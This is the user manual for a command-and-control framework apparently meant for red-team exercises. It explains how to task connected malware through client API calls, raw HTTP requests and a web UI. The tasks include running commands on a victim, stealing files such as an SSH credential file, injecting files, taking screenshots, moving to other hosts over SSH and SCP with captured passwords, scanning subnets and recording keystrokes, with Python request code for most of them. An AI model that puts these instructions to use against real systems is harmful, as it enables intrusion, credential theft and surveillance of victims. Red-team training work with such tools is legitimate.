# Ninja-Framework User Manual

This user manual will show the how to use the c2Client API, normal HTTP/HTTPS request and web UI to control the malicious action of the malware and C2 functions.

```
# Created:     2024/05/23
# version:     v0.2.3
# Copyright:   Copyright (c) 2024 LiuYuancheng
# License:     MIT License
```

**Table of Contents**

[TOC]

------

### C2 Function API

C2 Function API is used for red team attack to interact with the C2 server.



#### Function [01] Download file from C2 to local 

**Use C2 client API** : 

```
c2Client.downloadfile(fileName, fileDir=dirpath)
```

- fileName: C2 storage file name.
- fileDir: local file storage directory path.

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/filedownload`
- Request type: `GET`
- Example: 

```
res = requests.get("http://127.0.0.1:5000/filedownload", json={"filename": 'readme.pdf'}, allow_redirects=True, verify=False) # set allow redirect to by pass load balancer
filePath = os.path.join(dirpath, 'readme.pdf')
if res.ok:
    with open(filePath, 'wb') as fh:
    	fh.write(res.content)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Download a file from C2 to local. ( as shown below )
- Select the download file from the drop down menu then press the `Download` button. 

![](doc/img/um/um_00.png)



#### Function [02] Upload a local file to C2 server 

**Use C2 client API** : 

```
c2Client.uploadfile(filePath)
```

- filePath: local file path. 

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/fileupload`
- Request type: `POST`
- Example: 

```
rst = requests.post(http://127.0.0.1:5000/fileupload, files={'file': (fileName, fh.read())}, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Upload a local file to C2 server. ( as shown below )
- Select the `choose file` to select the local file then press the `upload` button. 

![](doc/img/um/um_01.png)



------

### Malware Task API

Malware Task API is used for red team attacker to assign task to the malware connected to RTC2. 



#### Attack Task [01] Run commands on victim

Description: Run one or multiple commands in the list sequence on the victim and archive the result in the C2 Data base.

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_CMD`
- Task data/parameters: list of command string.
- Example:

```python
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_CMD,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ['ipconfig']
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
jsonDict = {
    'id': malware1id, 
    'taskType'  : 'command',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ['dir']
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict, allow_redirects=True, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => select `01. Run commands on victim` => Fill in the command string => Press `submit` button
- When the task state change to "finished", press the "show task result" to check the execution result.

![](doc/img/um/um_03.png)



#### Attack Task [02] Steal file from victim to C2-DB

Description: Search multiple files on victim based on the file path list and upload found files from victim local storage to RTC2's cloud storage data base. 

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_UPLOAD`
- Task data/parameters: list of file path attacker want to steal.
- Example:

```python
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_UPLOAD,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ['C:\\Works\\Download\\sshCredential.txt']
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
jsonDict = {
    'id': malware1id, 
    'taskType'  : 'upload',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ['dir']
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict, allow_redirects=True, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `02. Steal file from victim to C2-DB` => Fill in the victim file path => Press `submit` button
- When the task state change to "finished", press the "show task result" to check the execution result or use the management page to download the file.

![](doc/img/um/um_04.png)



#### Attack Task [03] Inject file from C2-DB to victim

Description: Inject a file from RTC2's cloud storage data base in to the victim's local storage. 

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_DOWNLOAD`
- Task data/parameters: list of inject files name
- Example:

```
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_DOWNLOAD,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ['picctureTestDownload.png']
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
jsonDict = {
    'id'        : malware1id, 
    'taskType'  : 'download',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ['picctureTestDownload.png']
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict, allow_redirects=True, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `03. Inject file from C2-DB to victim` => Select the inject file from the drop down menu => Press `inject` button
- When the task state change to "finished", press the `show task result` button to check the execution result. If show file transferred, means the file injection successful. 

![](doc/img/um/um_05.png)



#### Attack Task [04] Capture victim screenshot to C2-DB

Description: Capture a screenshot of the victim's desktop and upload the image file to RTC2's cloud storage data base. 

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_SCREENST`
- Task data/parameters: None or 'None' or screen shot file name.
- Example:

```
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_SCREENST,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : 'None'
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
jsonDict = {
    'id'        : malware1id, 
    'taskType'  : 'screenShot',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : None
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `04. Capture victim screenshot to C2-DB` Press `submit` button
- When the task state change to "finished", press the `show task result` button to check the execution result. The uploaded screen shot file name will be shown in the result. 

![](doc/img/um/um_06.png)



#### Attack Task [05] SSH to target and run command from victim

Description: Control the victim machine to SSH login to another machine linked to the victim and run command on that machine. 

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_SSH`
- Task data/parameters: `str(<target_IP_address>;<user_name>;<password_str>;<command_string>)`
- Example:

```
malware1id = 'spyTrojan01'
targetIP = str(input("Input target IP : "))
userName = str(input("Input UserName : "))
password = str(input("Input Password : "))
command = str(input("Input command : "))
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_SSH,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ';'.join((targetIP, userName, password, command))
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
    malware1id = 'spyTrojan01'
    targetIP = str(input("Input target IP/Domain  : "))
    userName = str(input("Input UserName : "))
    password = str(input("Input Password : "))
    command = str(input("Input command : "))
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'sshRun',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : ';'.join((targetIP, userName, password, command))
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
```



**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `05. SSH to Target and Run Cmd from victim` => Fill in the parameters `SSH target IP`, `SSH User Name`,  `SSH User Password`  and `SSH Command`, then Press `submit` button. 
- When the task state change to "finished", press the `show task result` button to check the execution result. 

![](doc/img/um/um_07.png)



#### Attack Task [06] SCP file from victim to target

Description: SCP a file in the victim to the target node 

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_SCP
- Task data/parameters: `str(<target_IP_address>;<user_name>;<password_str>;<filename_string>)`
- Example:

```
malware1id = 'spyTrojan01'
targetIP = str(input("Input target IP/Domain : "))
userName = str(input("Input UserName : "))
password = str(input("Input Password : "))
filename = str(input("Input TSK_TYPE_SCP : "))
testTaskJson = {
    'taskType': c2Constants.TSK_TYPE_SCP,
    'startT': None,
    'repeat': 1,
    'exePreT': 0,
    'state': c2Constants.TASK_P_FLG,
    'taskData': ';'.join((targetIP, userName, password, filename))
}
c2Client.postTask(malware1id, testTaskJson)
```



**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
targetIP = str(input("Input target IP/Domain  : "))
userName = str(input("Input UserName : "))
password = str(input("Input password : "))
command = str(input("Input filename : "))
jsonDict = {
    'id'        : malware1id, 
    'taskType'  : 'scpFile',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ';'.join((targetIP, userName, password, command))
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
```



**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `06. SCP file from victim to target` => Fill in the parameters `SSH target IP`, `SSH User Name`,  `SSH User Password`  and `Scp file name`, then Press `submit` button. 
- When the task state change to "finished", press the `show task result` button to check the execution result. 

![](doc/img/um/um_08.png)



#### Attack Task [07] Scan victim sub-network IPs

Description: scan the subnet victim node in and find all the touchable nodes ip addresses.

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_SCANNET`
- Task data/parameters: subnet string xxx.xxx.xxx.0/24
- Example:

```
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType': c2Constants.TSK_TYPE_SCANNET,
    'startT': None,
    'repeat': 1,
    'exePreT': 0,
    'state': c2Constants.TASK_P_FLG,
    'taskData': '172.25.120.0/24'
}
c2Client.postTask(malware1id, testTaskJson)
```



**Use normal http/https request**

- API URL: `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
jsonDict = {
    'id'        : malware1id, 
    'taskType'  : 'scanSubnet',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : '172.25.120.0/24'
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
```



**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `07. Scan victim sub-network IPst` => Fill in the parameters `subnet IP range` , then Press `submit` button. 
- When the task state change to "finished", press the `show task result` button to check the execution result. All the IP addresses found in the subnet will be shown in the result. 

![](doc/img/um/um_09.png)



#### Attack Task [08] Generate or record keyboard event

Description: Generate or record the keyboard action/event on the victim machine

**Use C2 client API**

- Function:  `c2Client.postTask(malware1id, testTaskJson)`
- Task type code: `c2Constants.TSK_TYPE_KEYBD`
- Task data/parameters: `keyevent_cmd;keyevent_parameter`
- Example:

```
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType': c2Constants.TSK_TYPE_KEYBD,
    'startT': None,
    'repeat': 1,
    'exePreT': 0,
    'state': c2Constants.TASK_P_FLG,
    'taskData': 'typeInStr;Hello world!'
}
c2Client.postTask(malware1id, testTaskJson)
```

Action parameter config list: 





